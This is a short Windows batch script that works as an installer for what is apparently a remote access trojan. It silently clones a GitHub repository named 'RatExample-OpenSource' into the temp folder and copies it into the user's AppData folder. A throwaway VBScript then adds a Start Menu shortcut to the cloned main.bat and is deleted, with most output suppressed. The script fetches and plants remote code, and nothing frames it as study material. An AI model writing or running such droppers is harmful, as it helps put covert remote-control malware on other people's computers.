@echo off

rem Step 1: Download Repository Content
echo Downloading repository content...
git clone https://github.com/oogaboogaman1231/RatExample-OpenSource.git "%TEMP%\RatExample" > nul 2>&1

rem Step 2: Copy Files to AppData Folder
echo Copying files to AppData...
xcopy /E /Y "%TEMP%\RatExample" "%APPDATA%\RatExample" > nul

rem Step 3: Create Shortcut for main.bat
echo Creating shortcut...
echo Set oWS = WScript.CreateObject("WScript.Shell") > "%TEMP%\CreateShortcut.vbs"
echo sLinkFile = "%APPDATA%\Microsoft\Windows\Start Menu\Programs\RatExample.lnk" >> "%TEMP%\CreateShortcut.vbs"
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> "%TEMP%\CreateShortcut.vbs"
echo oLink.TargetPath = "%APPDATA%\RatExample\main.bat" >> "%TEMP%\CreateShortcut.vbs"
echo oLink.Save >> "%TEMP%\CreateShortcut.vbs"
cscript //nologo "%TEMP%\CreateShortcut.vbs" > nul

rem Cleanup
del "%TEMP%\CreateShortcut.vbs" > nul 2>&1

echo Installation complete.
pause
